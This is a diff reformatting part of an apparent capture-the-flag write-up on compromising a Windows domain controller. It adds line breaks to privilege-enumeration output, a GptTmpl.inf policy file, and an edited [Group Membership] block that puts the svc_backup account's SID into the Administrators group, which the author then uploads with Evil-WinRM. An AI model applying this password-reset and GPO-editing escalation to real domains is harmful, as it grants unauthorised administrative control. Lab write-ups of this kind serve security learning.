@@ -88,7 +88,42 @@ enumprivs
 ```
 
 ```
-found 35 privilegesSeCreateTokenPrivilege          0:2 (0x0:0x2)SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)SeLockMemoryPrivilege           0:4 (0x0:0x4)SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)SeMachineAccountPrivilege               0:6 (0x0:0x6)SeTcbPrivilege          0:7 (0x0:0x7)SeSecurityPrivilege             0:8 (0x0:0x8)SeTakeOwnershipPrivilege                0:9 (0x0:0x9)SeLoadDriverPrivilege           0:10 (0x0:0xa)SeSystemProfilePrivilege                0:11 (0x0:0xb)SeSystemtimePrivilege           0:12 (0x0:0xc)SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)SeCreatePagefilePrivilege               0:15 (0x0:0xf)SeCreatePermanentPrivilege              0:16 (0x0:0x10)SeBackupPrivilege               0:17 (0x0:0x11)SeRestorePrivilege              0:18 (0x0:0x12)SeShutdownPrivilege             0:19 (0x0:0x13)SeDebugPrivilege                0:20 (0x0:0x14)SeAuditPrivilege                0:21 (0x0:0x15)SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)SeChangeNotifyPrivilege                 0:23 (0x0:0x17)SeRemoteShutdownPrivilege               0:24 (0x0:0x18)SeUndockPrivilege               0:25 (0x0:0x19)SeSyncAgentPrivilege            0:26 (0x0:0x1a)SeEnableDelegationPrivilege             0:27 (0x0:0x1b)SeManageVolumePrivilege                 0:28 (0x0:0x1c)SeImpersonatePrivilege          0:29 (0x0:0x1d)SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)SeRelabelPrivilege              0:32 (0x0:0x20)SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)SeTimeZonePrivilege             0:34 (0x0:0x22)SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
+found 35 
+privilegesSeCreateTokenPrivilege          0:2 (0x0:0x2)
+SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
+SeLockMemoryPrivilege           0:4 (0x0:0x4)
+SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
+SeMachineAccountPrivilege               0:6 (0x0:0x6)
+SeTcbPrivilege          0:7 (0x0:0x7)
+SeSecurityPrivilege             0:8 (0x0:0x8)
+SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
+SeLoadDriverPrivilege           0:10 (0x0:0xa)
+SeSystemProfilePrivilege                0:11 (0x0:0xb)
+SeSystemtimePrivilege           0:12 (0x0:0xc)
+SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
+SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
+SeCreatePagefilePrivilege               0:15 (0x0:0xf)
+SeCreatePermanentPrivilege              0:16 (0x0:0x10)
+SeBackupPrivilege               0:17 (0x0:0x11)
+SeRestorePrivilege              0:18 (0x0:0x12)
+SeShutdownPrivilege             0:19 (0x0:0x13)
+SeDebugPrivilege                0:20 (0x0:0x14)
+SeAuditPrivilege                0:21 (0x0:0x15)
+SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
+SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
+SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
+SeUndockPrivilege               0:25 (0x0:0x19)
+SeSyncAgentPrivilege            0:26 (0x0:0x1a)
+SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
+SeManageVolumePrivilege                 0:28 (0x0:0x1c)
+SeImpersonatePrivilege          0:29 (0x0:0x1d)
+SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
+SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
+SeRelabelPrivilege              0:32 (0x0:0x20)
+SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
+SeTimeZonePrivilege             0:34 (0x0:0x22)
+SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
+SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
 ```
 
 If this is the case then maybe I can change password for some other users, according to mubix blog-post2. So I tried changing the password for the high privileged accounts,until I found that it worked on the audit2020 account:
@@ -197,8 +232,43 @@ The account svc_backup is not a member of the administrators group, yet.
 The file GptTmpl.inf looks like this:
 
 ```
-[Unicode]Unicode=yes[Registry Values]MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1[Privilege Rights]SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19SeAuditPrivilege = *S-1-5-20,*S-1-5-19SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0SeCreatePagefilePrivilege = *S-1-5-32-544SeDebugPrivilege = *S-1-5-32-544SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
-SeMachineAccountPrivilege = *S-1-5-11SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0SeProfileSingleProcessPrivilege = *S-1-5-32-544SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544SeSecurityPrivilege = *S-1-5-32-544SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544SeSystemEnvironmentPrivilege = *S-1-5-32-544SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19SeTakeOwnershipPrivilege = *S-1-5-32-544SeUndockPrivilege = *S-1-5-32-544SeEnableDelegationPrivilege = *S-1-5-32-544[Version]signature="$CHICAGO$"Revision=1
+[Unicode]
+Unicode=yes
+[Registry Values]
+MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
+MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
+MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
+MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
+
+[Privilege Rights]
+SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
+SeAuditPrivilege = *S-1-5-20,*S-1-5-19
+SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
+SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
+SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
+SeCreatePagefilePrivilege = *S-1-5-32-544
+SeDebugPrivilege = *S-1-5-32-544
+SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
+SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
+SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
+SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
+SeMachineAccountPrivilege = *S-1-5-11
+SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
+SeProfileSingleProcessPrivilege = *S-1-5-32-544
+SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
+SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
+SeSecurityPrivilege = *S-1-5-32-544
+SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
+SeSystemEnvironmentPrivilege = *S-1-5-32-544
+SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
+SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
+SeTakeOwnershipPrivilege = *S-1-5-32-544
+SeUndockPrivilege = *S-1-5-32-544
+SeEnableDelegationPrivilege = *S-1-5-32-544
+
+[Version]
+signature="$CHICAGO$"
+Revision=1
 ```
 
 I wanted to change this file so the user svc_backup becomes a member of the administrators group. The whoami /all command gave me the information that the user svc_backup’s SID is:
@@ -211,7 +281,9 @@ I copied the content of the GptTmpl.inf file to a text editor on my local machin
 
 
 ```
-[Group Membership]*S-1-5-21-4194615774-2175524697-3563712290-1413__Memberof = *S-1-5-32-544*S-1-5-21-4194615774-2175524697-3563712290-1413__Members =
+[Group Membership]
+*S-1-5-21-4194615774-2175524697-3563712290-1413__Memberof = *S-1-5-32-544
+*S-1-5-21-4194615774-2175524697-3563712290-1413__Members =
 ```
 
 With this edit I put my self into the administrators group (S-1-5-32-544). I saved the file on my Kali system and uploaded it to thedomain controller with Evil-WinRM. I replaced the file in the secedit folder with the one that I uploaded.
